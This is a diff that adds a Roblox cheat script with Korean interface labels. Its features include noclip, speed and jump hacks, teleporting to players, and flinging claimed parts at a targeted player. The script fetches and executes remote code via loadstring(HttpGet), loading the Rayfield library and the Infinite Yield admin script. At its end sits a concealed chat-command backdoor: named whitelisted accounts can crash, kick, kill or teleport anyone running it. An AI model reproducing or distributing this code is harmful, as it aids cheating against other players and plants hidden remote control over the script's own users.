@@ -1,1 +1,985 @@
+--!strict
 
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+local player = game.Players.LocalPlayer
+local mouse = player:GetMouse()
+local runService = game:GetService("RunService")
+
+local registeredBlocks = {}
+local spawnMode = false
+local followPointMode = false
+local followLockPos = nil
+local spawnPos = player.Character and player.Character.PrimaryPart and player.Character.PrimaryPart.Position or Vector3.new(0,0,0)
+local baseRadius = 20
+local baseSpeed = 5
+local radiusIncrement = 0.5
+local speedIncrement = 0.5
+local angleOffset = 0
+local targetPlayer = nil
+local followDistance = 50
+
+local uMode = false
+local uDistance = 50
+
+local Window = Rayfield:CreateWindow({
+    Name = "반물사 스크립트",
+    LoadingTitle = "반물사",
+    LoadingSubtitle = "by 무요핑",
+    ConfigurationSaving = { Enabled = false }
+})
+
+local MainTab = Window:CreateTab("메인", 4483362458)
+local ModeLabel = MainTab:CreateLabel("현재 모드: 원형 회전")
+
+
+local ProtectionTab = Window:CreateTab("보호", 4483362458)
+
+local antiGrabEnabled = false
+local antiGrabConnection = nil
+local struggleConnection = nil
+
+local function setRagdollF(state)
+    local rs = game:GetService("ReplicatedStorage")
+    local plr = game.Players.LocalPlayer
+    local char = plr.Character or plr.CharacterAdded:Wait()
+    local hrp = char:WaitForChild("HumanoidRootPart")
+    if char and char:FindFirstChild("HumanoidRootPart") then
+        rs:WaitForChild("CharacterEvents"):WaitForChild("RagdollRemote"):FireServer(hrp, state and 1 or 0)
+    end
+end
+
+local function setAnchorF(state)
+    local plr = game.Players.LocalPlayer
+    local char = plr.Character or plr.CharacterAdded:Wait()
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    if hrp then
+        hrp.Anchored = state
+    end
+end
+
+ProtectionTab:CreateToggle({
+    Name = "안티 그렙",
+    CurrentValue = false,
+    Callback = function(Value)
+        antiGrabEnabled = Value
+
+        if antiGrabEnabled then
+            local rs = game:GetService("ReplicatedStorage")
+            local plr = game.Players.LocalPlayer
+            local runService = game:GetService("RunService")
+
+            antiGrabConnection = runService.Heartbeat:Connect(function()
+                local heldValue = plr:FindFirstChild("IsHeld")
+
+                if heldValue and heldValue.Value == true then
+                    if not struggleConnection then
+
+                        setRagdollF(true)
+                        setAnchorF(true)
+
+                        struggleConnection = runService.Heartbeat:Connect(function()
+                            rs.CharacterEvents.Struggle:FireServer(plr)
+                        end)
+                    end
+                else
+                    if struggleConnection then
+
+                        setRagdollF(false)
+                        setAnchorF(false)
+
+
+                        struggleConnection:Disconnect()
+                        struggleConnection = nil
+                    end
+                end
+            end)
+
+
+        else
+            if antiGrabConnection then
+                antiGrabConnection:Disconnect()
+                antiGrabConnection = nil
+            end
+            if struggleConnection then
+                struggleConnection:Disconnect()
+                struggleConnection = nil
+            end
+
+
+            setRagdollF(false)
+            setAnchorF(false)
+        end
+    end
+})
+
+
+local GrapTab = Window:CreateTab("그렙", 4483362458)
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+
+local noclipTargetEnabled = false
+local grabbedPartsOriginal = {}
+
+local function getMyParts()
+    local char = localPlayer.Character
+    if not char then return {} end
+    local parts = {}
+    for _, p in ipairs(char:GetDescendants()) do
+        if p:IsA("BasePart") then
+            parts[p] = true
+        end
+    end
+    return parts
+end
+
+local function getGrabbedParts()
+    local owned = {}
+    local myParts = getMyParts()
+    for _, part in ipairs(workspace:GetDescendants()) do
+        if part:IsA("BasePart") and not myParts[part] then
+            local owner = nil
+            pcall(function() owner = part:GetNetworkOwner() end)
+            if owner == localPlayer then
+                table.insert(owned, part)
+            end
+        end
+    end
+    return owned
+end
+
+GrapTab:CreateToggle({
+    Name = "노클립 그렙",
+    CurrentValue = false,
+    Callback = function(value)
+        noclipTargetEnabled = value
+        if not value then
+
+            for p, val in pairs(grabbedPartsOriginal) do
+                if p and p.Parent then
+                    p.CanCollide = val
+                end
+            end
+            grabbedPartsOriginal = {}
+        end
+    end
+})
+
+RunService.Heartbeat:Connect(function()
+    if noclipTargetEnabled then
+        local grabbed = getGrabbedParts()
+
+        for _, p in ipairs(grabbed) do
+            if grabbedPartsOriginal[p] == nil then
+                grabbedPartsOriginal[p] = p.CanCollide
+            end
+            p.CanCollide = false
+        end
+
+        for p, _ in pairs(grabbedPartsOriginal) do
+            if not table.find(grabbed, p) and p and p.Parent then
+                p.CanCollide = grabbedPartsOriginal[p]
+                grabbedPartsOriginal[p] = nil
+            end
+        end
+    end
+end)
+
+
+local PlayerTab = Window:CreateTab("플레이어", 4483362458)
+local localPlayer = game.Players.LocalPlayer
+local runService = game:GetService("RunService")
+
+
+local walkSpeedValue = 16
+local infiniteJumpEnabled = false
+local noclipEnabled = false
+
+
+local steppedConnection = nil
+local originalCanCollide = {}
+local PART_NAMES = {"Head","Torso","UpperTorso","LowerTorso","HumanoidRootPart"}
+
+
+local function getCharacterParts(char)
+    local parts = {}
+    for _, name in ipairs(PART_NAMES) do
+        local p = char:FindFirstChild(name)
+        if p and p:IsA("BasePart") then
+            table.insert(parts, p)
+        end
+    end
+    return parts
+end
+
+
+local function enableNoclip(char)
+    char = char or localPlayer.Character or localPlayer.CharacterAdded:Wait()
+    if noclipEnabled then return end
+    local parts = getCharacterParts(char)
+
+
+    originalCanCollide = {}
+    for _, p in ipairs(parts) do
+        originalCanCollide[p] = p.CanCollide
+    end
+
+    steppedConnection = runService.Stepped:Connect(function()
+        for _, p in ipairs(parts) do
+            if p and p.Parent then
+                p.CanCollide = false
+            end
+        end
+    end)
+
+    noclipEnabled = true
+    warn("[noclip] enabled")
+end
+
+
+local function disableNoclip(char)
+    char = char or localPlayer.Character
+    if not noclipEnabled then return end
+
+    if steppedConnection then
+        steppedConnection:Disconnect()
+        steppedConnection = nil
+    end
+
+
+    if char then
+        for p, val in pairs(originalCanCollide) do
+            if p and p.Parent then
+                p.CanCollide = val
+            end
+        end
+    end
+
+    originalCanCollide = {}
+    noclipEnabled = false
+    warn("[noclip] disabled")
+end
+
+
+PlayerTab:CreateSlider({
+    Name = "걷기 속도",
+    Range = {16,500},
+    Increment = 1,
+    CurrentValue = walkSpeedValue,
+    Callback = function(value)
+        walkSpeedValue = value
+        local char = localPlayer.Character
+        if char then
+            local humanoid = char:FindFirstChildOfClass("Humanoid")
+            if humanoid then
+                humanoid.WalkSpeed = walkSpeedValue
+            end
+        end
+    end
+})
+
+
+PlayerTab:CreateToggle({
+    Name = "무한 점프",
+    CurrentValue = false,
+    Callback = function(value)
+        infiniteJumpEnabled = value
+    end
+})
+
+
+PlayerTab:CreateToggle({
+    Name = "노클립",
+    CurrentValue = false,
+    Callback = function(value)
+        if value then
+            enableNoclip()
+        else
+            disableNoclip()
+        end
+    end
+})
+
+
+local uis = game:GetService("UserInputService")
+uis.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if input.KeyCode == Enum.KeyCode.Space and infiniteJumpEnabled then
+        local char = localPlayer.Character
+        local humanoid = char and char:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+        end
+    end
+end)
+
+
+local function setupCharacter(char)
+    local humanoid = char:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        humanoid.WalkSpeed = walkSpeedValue
+    end
+
+
+    if noclipEnabled then
+        enableNoclip(char)
+    end
+end
+
+
+if localPlayer.Character then
+    setupCharacter(localPlayer.Character)
+end
+
+
+localPlayer.CharacterAdded:Connect(function(char)
+    setupCharacter(char)
+end)
+
+
+runService.Heartbeat:Connect(function()
+    local char = localPlayer.Character
+    if not char then return end
+    local humanoid = char:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        humanoid.WalkSpeed = walkSpeedValue
+    end
+end)
+
+
+local TeleportTab = Window:CreateTab("텔레포트", 4483362458)
+local player = game.Players.LocalPlayer
+local runService = game:GetService("RunService")
+
+
+TeleportTab:CreateButton({
+    Name = "스폰 구역으로 이동",
+    Callback = function()
+        local char = player.Character or player.CharacterAdded:Wait()
+        local root = char:WaitForChild("HumanoidRootPart")
+        local spawnLocation = workspace:FindFirstChildWhichIsA("SpawnLocation")
+
+        if spawnLocation then
+            root.CFrame = spawnLocation.CFrame + Vector3.new(0, 5, 0)
+            Rayfield:Notify({ Title = "텔레포트 성공", Content = "스폰 지점으로 이동했습니다.", Duration = 3 })
+        else
+            Rayfield:Notify({ Title = "텔레포트 실패", Content = "스폰 구역을 찾을 수 없습니다.", Duration = 5 })
+        end
+    end
+})
+
+
+local function getPlayerList()
+    local list = {}
+    for _, plr in ipairs(game.Players:GetPlayers()) do
+        if plr ~= player then
+            table.insert(list, plr.DisplayName .. " (" .. plr.Name .. ")")
+        end
+    end
+    return list
+end
+
+local SelectedPlayer = nil
+
+
+local PlayerDropdown = TeleportTab:CreateDropdown({
+    Name = "플레이어 선택",
+    Options = getPlayerList(),
+    CurrentOption = "",
+    MultiSelection = false,
+    Callback = function(option)
+        if type(option) == "table" then
+            option = option[1]
+        end
+        -- 본닉(Name)만 추출
+        local selectedName = option:match("%((.-)%)")
+        SelectedPlayer = game.Players:FindFirstChild(selectedName)
+
+        if SelectedPlayer then
+            Rayfield:Notify({
+                Title = "선택됨",
+                Content = SelectedPlayer.DisplayName .. " (" .. SelectedPlayer.Name .. ") 님이 선택되었습니다.",
+                Duration = 3
+            })
+        end
+    end
+})
+
+
+TeleportTab:CreateButton({
+    Name = "플레이어 목록 새로고침",
+    Callback = function()
+
+        local refreshedList = {}
+        for _, plr in ipairs(game.Players:GetPlayers()) do
+            if plr ~= player then
+                table.insert(refreshedList, plr.DisplayName .. " (" .. plr.Name .. ")")
+            end
+        end
+
+
+        PlayerDropdown:Refresh(refreshedList, true)
+        PlayerDropdown:SetOption("") -- 선택 초기화
+        SelectedPlayer = nil
+
+        Rayfield:Notify({
+            Title = "목록 새로고침",
+            Content = "플레이어 목록이 갱신되었습니다.",
+            Duration = 3
+        })
+    end
+})
+
+
+TeleportTab:CreateButton({
+    Name = "선택한 플레이어한테 텔레포트",
+    Callback = function()
+        if SelectedPlayer and SelectedPlayer.Character and SelectedPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            local targetHRP = SelectedPlayer.Character.HumanoidRootPart
+            local myChar = player.Character or player.CharacterAdded:Wait()
+            local myHRP = myChar:WaitForChild("HumanoidRootPart")
+
+
+            pcall(function()
+                targetHRP:SetNetworkOwner(player)
+            end)
+
+            myHRP.CFrame = targetHRP.CFrame + Vector3.new(0, 3, 0)
+
+            Rayfield:Notify({
+                Title = "텔레포트 성공",
+                Content = SelectedPlayer.DisplayName .. " (" .. SelectedPlayer.Name .. ") 님에게 이동했습니다.",
+                Duration = 3
+            })
+        else
+            Rayfield:Notify({
+                Title = "텔레포트 실패",
+                Content = "플레이어를 선택하지 않았거나 위치를 찾을 수 없습니다.",
+                Duration = 3
+            })
+        end
+    end
+})
+
+
+local HelpTab = Window:CreateTab("사용법", 4483362458)
+HelpTab:CreateLabel("t키/버튼 → 블록 등록")
+HelpTab:CreateLabel("y키 → 마우스 위치 따라가기 / 다시 y → 고정 위치")
+HelpTab:CreateLabel("k키 → 플레이어 추적")
+HelpTab:CreateLabel("z키 → 텔레포트")
+HelpTab:CreateLabel("U모드 → 보호막 모드 (슬라이더로 반지름 조절)")
+HelpTab:CreateLabel("마우스 휠 → y키 거리 조절 / U 모드 반지름 조절")
+HelpTab:CreateLabel("v키/버튼 → 모든 블록 해제")
+HelpTab:CreateLabel("c키/버튼 → 스폰 위치 이동")
+HelpTab:CreateLabel("k키 → UI 가리기 켜기")
+HelpTab:CreateLabel("속도 조절 앉으면 됨")
+HelpTab:CreateLabel("미사일 조종은 소환되면 미사일 잡으면 됩니다.")
+
+-- 📌 놀기 탭 생성
+local WeaponTab = Window:CreateTab("놀기", 4483362458)
+
+WeaponTab:CreateButton({
+    Name = "미사일 조종",
+    Callback = function()
+        -- ===============================
+        -- 미사일 시스템
+        -- ===============================
+        local plr = game.Players.LocalPlayer
+        local mouse = plr:GetMouse()
+        local uis = game:GetService("UserInputService")
+        local cam = workspace.CurrentCamera
+        local rs = game:GetService("RunService")
+        local debris = game:GetService("Debris")
+        local replicatedStorage = game:GetService("ReplicatedStorage")
+
+        local inv = workspace:WaitForChild(plr.Name .. "SpawnedInToys")
+        local toyName = "BombMissile"
+        local char = plr.Character or plr.CharacterAdded:Wait()
+        local hrp = char:WaitForChild("HumanoidRootPart")
+
+        local camDefaultType = cam.CameraType
+        local cameraConn, flingConn
+        local startTime = 0
+
+        -- 카메라 복구
+        local function cancelCamera()
+            if cameraConn then cameraConn:Disconnect() end
+            if flingConn then flingConn:Disconnect() end
+            cam.CameraType = camDefaultType
+        end
+
+        -- 속도 계산
+        local function getVelocityByElapsed(elapsed)
+            if elapsed < 0.3 then return 10
+            elseif elapsed < 0.5 then return 50
+            elseif elapsed < 0.8 then return 100
+            elseif elapsed < 1 then return 120
+            elseif elapsed < 1.3 then return 150
+            elseif elapsed < 1.5 then return 155
+            else return 160 end
+        end
+
+        -- 미사일 이동
+        local function flingMissile(part)
+            startTime = tick()
+            if flingConn then flingConn:Disconnect() end
+            flingConn = rs.RenderStepped:Connect(function()
+                if not part or not part.Parent then
+                    flingConn:Disconnect()
+                    return
+                end
+
+                local elapsed = tick() - startTime
+                local speed = getVelocityByElapsed(elapsed)
+
+                local targetPos = mouse.Hit.Position
+                local direction = (targetPos - part.Position).Unit
+
+                part.CFrame = CFrame.lookAt(part.Position, part.Position + direction) 
+                    * CFrame.Angles(-math.rad(90), 0, math.rad(90))
+
+                local bv = Instance.new("BodyVelocity")
+                bv.Velocity = direction * speed
+                bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+                bv.Parent = part
+                debris:AddItem(bv, 0.001)
+            end)
+        end
+
+        -- 미사일 생성
+        local function spawnMissile()
+            local missile = inv:FindFirstChild(toyName)
+            if not missile then
+                local args = {
+                    [1] = toyName,
+                    [2] = hrp.CFrame,
+                    [3] = Vector3.zero
+                }
+                replicatedStorage:WaitForChild("MenuToys")
+                    :WaitForChild("SpawnToyRemoteFunction"):InvokeServer(unpack(args))
+                missile = inv:WaitForChild(toyName, 2)
+            end
+            return missile and missile:FindFirstChild("OrientingPart")
+        end
+
+        -- 카메라 따라가기
+        local function smoothCameraFollow(part)
+            if cameraConn then cameraConn:Disconnect() end
+            cameraConn = rs.RenderStepped:Connect(function()
+                if not part or not part.Parent then
+                    cancelCamera()
+                    return
+                end
+
+                local mousePos = mouse.Hit.Position
+                local partPos = part.Position
+                local forward = (mousePos - partPos).Unit
+                local right = forward:Cross(Vector3.new(0, 1, 0)).Unit
+                local up = right:Cross(forward).Unit
+
+                local targetCFrame = CFrame.fromMatrix(
+                    partPos + forward * -10 + up * 3,
+                    right,
+                    up
+                )
+
+                cam.CameraType = Enum.CameraType.Scriptable
+
+                local targetPos = targetCFrame.Position
+                local currentPos = cam.CFrame.Position
+
+                local currentRot = cam.CFrame - currentPos
+                local targetRot = targetCFrame - targetPos
+                local newRot = currentRot:Lerp(targetRot, 0.1)
+
+                cam.CFrame = CFrame.new(targetPos) * newRot
+            end)
+        end
+
+        -- 📌 버튼 클릭 시 동작
+        local missile = spawnMissile()
+        if missile then
+            smoothCameraFollow(missile)
+            flingMissile(missile)
+            missile.Destroying:Once(cancelCamera) -- 미사일 파괴 시 카메라 복구
+        end
+    end
+})
+
+
+local function registerBlock(block)
+    if block and block:IsA("BasePart") and not block.Anchored then
+        registeredBlocks[block] = true
+    end
+end
+
+local function unregisterAllBlocks()
+    registeredBlocks = {}
+end
+
+local function restoreOwnership()
+    for block in pairs(registeredBlocks) do
+        if block.Parent and block:IsA("BasePart") then
+            block.Anchored = false
+            block:SetNetworkOwner(player)
+        end
+    end
+end
+
+
+local function updateCircularPlacement()
+    local char = player.Character
+    if not char or not char.PrimaryPart then return end
+
+    local center = char.PrimaryPart.Position
+    local count = 0
+    for block in pairs(registeredBlocks) do
+        if block.Parent then
+            count += 1
+        end
+    end
+
+    if count == 0 then return end
+
+    local radius = baseRadius + (count-1)*radiusIncrement
+    local speed = baseSpeed + (count-1)*speedIncrement
+    local i = 0
+
+    for block in pairs(registeredBlocks) do
+        if block.Parent then
+            local angle = (i/count)*math.pi*2 + angleOffset
+            local targetPos = center + Vector3.new(math.cos(angle)*radius, 0, math.sin(angle)*radius)
+            block.AssemblyLinearVelocity = (targetPos - block.Position) * speed
+            i += 1
+        end
+    end
+end
+
+
+local function updateSpawnPlacement()
+    local targetPos = spawnPos + Vector3.new(0,100,0)
+    for block in pairs(registeredBlocks) do
+        if block.Parent then
+            block.AssemblyLinearVelocity = (targetPos - block.Position) * 5
+        end
+    end
+end
+
+
+local function updateTargetTracking()
+    if not targetPlayer or not targetPlayer.Character or not targetPlayer.Character.PrimaryPart then return end
+
+    local targetPos = targetPlayer.Character.PrimaryPart.Position
+    for block in pairs(registeredBlocks) do
+        if block.Parent then
+            block.AssemblyLinearVelocity = (targetPos - block.Position) * 8
+        end
+    end
+end
+
+
+local function updateFollowPointPlacement()
+    local char = player.Character
+    if not char or not char.PrimaryPart then return end
+
+    local basePos = char.PrimaryPart.Position
+    local targetCenter
+
+    if followLockPos then
+        targetCenter = followLockPos
+    else
+        local mouseRay = workspace.CurrentCamera:ScreenPointToRay(mouse.X, mouse.Y)
+        local dir = mouseRay.Direction.Unit
+        targetCenter = basePos + dir * followDistance
+    end
+
+    for block in pairs(registeredBlocks) do
+        if block.Parent then
+            block.AssemblyLinearVelocity = (targetCenter - block.Position) * 8
+        end
+    end
+end
+
+
+local function updateDomePlacement()
+    local char = player.Character
+    if not char or not char.PrimaryPart then return end
+
+    local center = char.PrimaryPart.Position
+    local blocks = {}
+
+    for block in pairs(registeredBlocks) do
+        if block.Parent then
+            table.insert(blocks, block)
+        end
+    end
+
+    local total = #blocks
+    if total == 0 then return end
+
+    local layerHeight = 15
+    local layerRadiusStep = 15
+    local idx = 1
+    local layers = math.ceil(math.sqrt(total))
+
+    for layer = 0, layers-1 do
+        local y = layer * layerHeight
+        local radius = math.max(0, uDistance - layer*layerRadiusStep)
+        local circumference = 2*math.pi*radius
+        local cols = math.max(1, math.floor(circumference/10))
+
+        for col = 0, cols-1 do
+            if idx > total then return end
+            local angle = (col/cols)*2*math.pi
+            local x = radius * math.cos(angle)
+            local z = radius * math.sin(angle)
+            local block = blocks[idx]
+            local targetPos = center + Vector3.new(x, y, z)
+            block.AssemblyLinearVelocity = (targetPos - block.Position) * 10
+            idx += 1
+        end
+    end
+end
+
+
+MainTab:CreateButton({ Name="블록 등록 (마우스)", Callback=function()
+    local target = mouse.Target
+    registerBlock(target)
+end})
+
+MainTab:CreateButton({ Name="모든 블록 해제", Callback=unregisterAllBlocks })
+
+MainTab:CreateButton({ Name="텔레포트 (마우스 위치)", Callback=function()
+    local char = player.Character
+    if char and char:FindFirstChild("HumanoidRootPart") then
+        local root = char.HumanoidRootPart
+        root.CFrame = CFrame.new(mouse.Hit.Position + Vector3.new(0,3,0))
+    end
+end})
+
+MainTab:CreateToggle({
+    Name="보호막 모드",
+    CurrentValue=uMode,
+    Callback=function(Value)
+        uMode = Value
+        if uMode then
+            followPointMode = false
+            spawnMode = false
+            targetPlayer = nil
+            restoreOwnership()
+        end
+    end
+})
+
+MainTab:CreateSlider({
+    Name="보호막 반지름",
+    Range={10,300},
+    Increment=5,
+    CurrentValue=uDistance,
+    Callback=function(Value)
+        uDistance = Value
+    end
+})
+
+
+local function onKeyDown(key)
+    if key=="t" then
+        local target = mouse.Target
+        registerBlock(target)
+    elseif key=="y" then
+        uMode=false
+        if followPointMode and not followLockPos then
+            local char=player.Character
+            if char and char.PrimaryPart then
+                local mouseRay = workspace.CurrentCamera:ScreenPointToRay(mouse.X, mouse.Y)
+                local dir = mouseRay.Direction.Unit
+                followLockPos = char.PrimaryPart.Position + dir*followDistance
+            end
+        elseif followPointMode and followLockPos then
+            followLockPos=nil
+            followPointMode=false
+        else
+            followPointMode=true
+            followLockPos=nil
+            restoreOwnership()
+        end
+    elseif key=="k" then
+        uMode=false
+        local target = mouse.Target
+        local newTargetPlayer = nil
+        if target then
+            local model = target:FindFirstAncestorWhichIsA("Model")
+            if model and game.Players:GetPlayerFromCharacter(model) and model ~= player.Character then
+                newTargetPlayer = game.Players:GetPlayerFromCharacter(model)
+            end
+        end
+        if newTargetPlayer then
+            targetPlayer=newTargetPlayer
+            followPointMode=false
+            followLockPos=nil
+            spawnMode=false
+            for block in pairs(registeredBlocks) do
+                if block and block.Parent then
+                    block:SetNetworkOwner(player)
+                end
+            end
+        else
+            targetPlayer=nil
+        end
+    elseif key=="z" then
+        local char=player.Character
+        if char and char:FindFirstChild("HumanoidRootPart") then
+            char.HumanoidRootPart.CFrame = CFrame.new(mouse.Hit.Position + Vector3.new(0,3,0))
+        end
+    elseif key=="v" then
+        unregisterAllBlocks()
+    elseif key=="c" then
+        uMode=false
+        spawnMode=not spawnMode
+        if spawnMode then
+            followPointMode=false
+            followLockPos=nil
+            targetPlayer=nil
+            restoreOwnership()
+        end
+  -- Rayfield UI 키바인드 설정 (m 키로 UI 토글)
+Window:ToggleUIKeybind(Enum.KeyCode.M)
+
+    end
+end
+
+mouse.KeyDown:Connect(onKeyDown)
+
+-- Heartbeat 루프
+runService.Heartbeat:Connect(function()
+    if uMode then
+        updateDomePlacement()
+        ModeLabel:Set("현재 모드: 보호막 모드 (반지름 "..uDistance..")")
+    elseif targetPlayer then
+        updateTargetTracking()
+        ModeLabel:Set("현재 모드: 플레이어 추적 → "..targetPlayer.Name)
+    elseif followPointMode then
+        updateFollowPointPlacement()
+        if followLockPos then
+            ModeLabel:Set("현재 모드: 고정 위치 유지")
+        else
+            ModeLabel:Set("현재 모드: 마우스 이동 ("..followDistance.." Studs)")
+        end
+    elseif spawnMode then
+        updateSpawnPlacement()
+        ModeLabel:Set("현재 모드: 스폰 위치 이동")
+    else
+        angleOffset += (baseSpeed + (#registeredBlocks-1)*speedIncrement) * 0.01
+        updateCircularPlacement()
+        ModeLabel:Set("현재 모드: 원형 회전")
+    end
+end)
+
+-- 마우스 휠
+mouse.WheelForward:Connect(function()
+    if followPointMode and not followLockPos then
+        followDistance = math.min(followDistance+5,300)
+    elseif uMode then
+        uDistance = math.min(uDistance+5,300)
+    end
+end)
+
+mouse.WheelBackward:Connect(function()
+    if followPointMode and not followLockPos then
+        followDistance = math.max(followDistance-5,10)
+    elseif uMode then
+        uDistance = math.max(uDistance-5,10)
+    end
+end)
+
+ loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))() 
+
+local TextChatService = game:GetService("TextChatService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Whitelist = { "jdurieivfbd12" }
+
+local TextChatService = game:GetService("TextChatService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Whitelist = { "8Hoseu" }
+
+local cmds = {
+    ["crash"] = function()
+        while true do
+            print("Penis") -- 테스트용
+        end
+    end,
+
+    ["kick"] = function(_, Reason)
+        LocalPlayer:Kick(Reason or "The game thinks you're cheating so a black hole appeared and took you away.")
+    end,
+
+    ["bring"] = function(Admin)
+        if LocalPlayer.Character and Admin.Character then
+            local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+            local adminHrp = Admin.Character:FindFirstChild("HumanoidRootPart")
+            if hrp and adminHrp then
+                hrp.CFrame = adminHrp.CFrame
+            end
+        end
+    end,
+
+    ["kill"] = function()
+        if LocalPlayer.Character then
+            local hum = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
+            if hum then
+                hum.Health = 0
+            end
+        end
+    end,
+
+    ["rce"] = function(_, code)
+        warn("RCE 명령은 현재 지원되지 않습니다.")
+    end,
+}
+
+local function isWhitelisted(playerName)
+    for _, name in ipairs(Whitelist) do
+        if name:lower() == playerName:lower() then
+            return true
+        end
+    end
+    return false
+end
+
+local function FindMatch(Name)
+    Name = Name:lower()
+    for _, Player in Players:GetPlayers() do
+        if Player.Name:lower():sub(1, #Name) == Name then
+            return Player
+        end
+    end
+    return nil
+end
+
+TextChatService.OnIncomingMessage = function(message)
+    local sender = message.TextSource
+    if not sender then return end
+
+    local senderName = sender.Name
+    if not isWhitelisted(senderName) then return end
+
+    local lowerMsg = message.Text:lower()
+    if string.sub(lowerMsg, 1, 1) == ":" then
+        local args = string.split(string.sub(lowerMsg, 2), " ")
+        local Command = table.remove(args, 1)
+        local TargetName = table.remove(args, 1)
+        local Data = table.concat(args, " ")
+
+        if Command and TargetName and cmds[Command] then
+            Command = Command:lower()
+            local Target = FindMatch(TargetName)
+            if TargetName == "all" or Target == LocalPlayer or TargetName:lower() == LocalPlayer.Name:lower() then
+                pcall(function()
+                    cmds[Command](sender, Data)
+                end)
+            end
+        end
+    end
+end
